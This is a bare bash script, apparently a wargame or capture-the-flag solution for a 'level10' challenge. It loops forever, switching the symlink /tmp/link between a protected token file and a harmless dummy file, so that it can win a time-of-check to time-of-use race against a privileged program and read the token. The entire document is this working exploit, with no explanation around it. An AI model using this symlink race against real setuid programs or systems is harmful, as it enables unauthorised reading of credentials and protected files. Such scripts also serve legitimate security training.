#!/bin/bash

echo "empty file" > /tmp/test

while :
do
    ln -sf /home/user/level10/token /tmp/link
    ln -sf /tmp/test /tmp/link
done
